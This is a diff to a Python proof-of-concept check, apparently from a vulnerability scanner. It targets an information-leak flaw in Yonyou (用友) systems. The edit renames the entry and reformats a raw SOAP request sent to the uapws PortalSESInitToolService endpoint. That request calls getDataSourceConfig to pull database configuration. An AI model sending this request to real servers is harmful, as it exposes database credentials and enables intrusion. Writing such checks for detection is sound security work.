@@ -6,7 +6,7 @@ import re
 hh = hackhttp.hackhttp()
 
 class Vuln(ABVuln):
-    vuln_id = 'yongyou_0039' # 平台漏洞编号，留空
+    vuln_id = 'Yonyou_0039' # 平台漏洞编号，留空
     name = '用友多个系统通用漏洞导致接口信息泄露引发多数据库信息泄露' # 漏洞名称
     level = VulnLevel.HIGH # 漏洞危害级别
     type = VulnType.INFO_LEAK # 漏洞类型
@@ -17,7 +17,7 @@ class Vuln(ABVuln):
     ref = 'https://wooyun.shuimugan.com/bug/view?bug_no=0112834' # 漏洞来源
     cnvd_id = 'Unknown' # cnvd漏洞编号
     cve_id = 'Unknown' #cve编号
-    product = '用友'  # 漏洞应用名称
+    product = 'Yonyou(用友)'  # 漏洞应用名称
     product_version = 'Unknown'  # 漏洞应用版本
 
 
@@ -37,18 +37,18 @@ class Poc(ABPoc):
             arg = '{target}'.format(target=self.target)
             url = arg + "uapws/service/nc.itf.ses.inittool.PortalSESInitToolService"
             raw = """POST /uapws/service/nc.itf.ses.inittool.PortalSESInitToolService HTTP/1.1
-                Host: www.baidu.com
-                Cache-Control: max-age=0
-                Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
-                Upgrade-Insecure-Requests: 1
-                User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/47.0.2526.73 Chrome/47.0.2526.73 Safari/537.36
-                DNT: 1
-                Accept-Encoding: gzip, deflate, sdch
-                Accept-Language: en-US,en;q=0.8,zh-CN;q=0.6,zh;q=0.4
-                Cookie: JSESSIONID=8094FB584D86D05EC578B3DA1A08BBA8.server
-                Content-Length: 349
+Host: www.baidu.com
+Cache-Control: max-age=0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/47.0.2526.73 Chrome/47.0.2526.73 Safari/537.36
+DNT: 1
+Accept-Encoding: gzip, deflate, sdch
+Accept-Language: en-US,en;q=0.8,zh-CN;q=0.6,zh;q=0.4
+Cookie: JSESSIONID=8094FB584D86D05EC578B3DA1A08BBA8.server
+Content-Length: 349
 
-                <?xml version="1.0" encoding="utf-8"?><soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Body><getDataSourceConfig xmlns="http://inittool.ses.itf.nc/PortalSESInitToolService"></getDataSourceConfig></soap:Body></soap:Envelope>"""
+<?xml version="1.0" encoding="utf-8"?><soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Body><getDataSourceConfig xmlns="http://inittool.ses.itf.nc/PortalSESInitToolService"></getDataSourceConfig></soap:Body></soap:Envelope>"""
 
             code, head,res, errcode, _ = hh.http(url,raw=raw)
             if code == 200 and 'getDataSourceConfigResponse' in res:
